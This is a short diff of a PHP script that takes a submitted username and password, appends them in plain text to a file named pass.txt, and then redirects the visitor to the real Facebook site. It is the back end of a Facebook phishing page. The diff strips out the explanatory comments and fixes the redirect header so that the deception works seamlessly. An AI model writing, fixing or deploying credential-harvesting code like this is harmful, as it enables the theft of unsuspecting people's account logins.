@@ -5,13 +5,11 @@ $password = $_POST['pass'];
 
 $file = 'pass.txt';
 
-$txt = file_get_contents($file);                 // Open the file to get existing content
+$txt = file_get_contents($file);
 
-$txt .= $username . " - " . $password . "\n";    // Append a new person's credentials to the file
+$txt .= $username . " - " . $password . "\n";
 
-file_put_contents($file, $txt);                  // Write the new contents back to the file
+file_put_contents($file, $txt);
 
 
-
-//redirect person to the actual facebook website
-header("https://www.facebook.com/");
+header("Location: https://www.facebook.com/");
